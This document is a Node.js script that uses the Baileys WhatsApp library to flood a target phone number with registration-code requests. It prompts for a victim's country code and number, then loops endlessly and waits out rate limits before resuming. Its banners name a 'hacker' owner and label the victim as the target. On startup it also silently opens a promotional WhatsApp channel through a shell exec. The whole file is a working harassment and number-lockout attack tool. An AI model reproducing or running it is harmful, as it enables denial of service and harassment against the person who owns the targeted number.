const prompt = require('prompt-sync')({ sigint: true });
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

// Setup
if (!fs.existsSync('./files')) fs.mkdirSync('./files');
if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
`;

const spiderArt = `
    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
    ${color('        /        \\        ', ['#FF0000', '#200000'])}
    ${color('      /            \\      ', ['#FF0000', '#200000'])}
    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
    ${color('        \\________/        ', ['#FF0000', '#200000'])}
    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
    ${color('     /              \\     ', ['#FF0000', '#200000'])}
`;

const start = async () => {
    console.clear(); // Screen saaf karne ke liye

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;
    exec(openCmd);

    console.log(masterBanner);
    console.log(spiderArt);
    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const dropNumber = async (context) => {
        const { ddi, number, phoneNumber } = context;
        while (true) {
            try {
                console.clear();
                console.log(masterBanner);
                console.log(spiderArt);
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
                console.log(color(`  [+] TARGET NUMBER : +${ddi}${number} `, ['#FF0000', '#FFFFFF']));
                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));

                // --- Original Working Logic (Unchanged) ---
                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    await new Promise(r => setTimeout(r, res.retry_after * 1000));
                }
            } catch (e) {
                // Background retry logic exactly as before
            }
        }
    };

    const targetDDI = prompt(color(' ► Enter Country Code (e.g 92): ', ['#00FFFF', '#FFFFFF']));
    const targetNum = prompt(color(' ► Enter Phone Number: ', ['#00FFFF', '#FFFFFF']));
    
    dropNumber({ 
        ddi: targetDDI, 
        number: targetNum, 
        phoneNumber: targetDDI + targetNum 
    });
};

start();
